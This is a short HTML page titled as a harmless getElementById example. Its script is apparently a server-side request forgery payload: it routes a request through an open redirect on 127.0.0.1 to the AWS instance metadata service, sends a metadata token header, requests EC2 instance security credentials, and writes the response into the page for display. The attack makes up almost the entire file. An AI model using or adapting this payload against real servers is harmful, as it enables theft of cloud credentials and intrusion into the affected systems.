<html>
<head>
  <title>getElementById example</title>
</head>
<body>
  <p id="output"></p>
  <p id="status"></p>
</body>
<script>
var url = "http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance";
var xhr = new XMLHttpRequest();
xhr.open("GET", url, true);
xhr.setRequestHeader('X-aws-ec2-metadata-token','AQAEAHGwT3PBZya5nK_P16IOJeET5TkcRuTl-ADGLs63qhA8YGowGw==');
xhr.onload = function () {
    if (xhr.readyState == 4 && xhr.status == "200") {
        document.getElementById('output').innerHTML = xhr.responseText;
    }
        document.getElementById("status").innerHTML = xhr.status;
        
}
xhr.send();
await sleep(1000);
document.getElementById("status").innerHTML = "foobar <3";
</script>
</html>
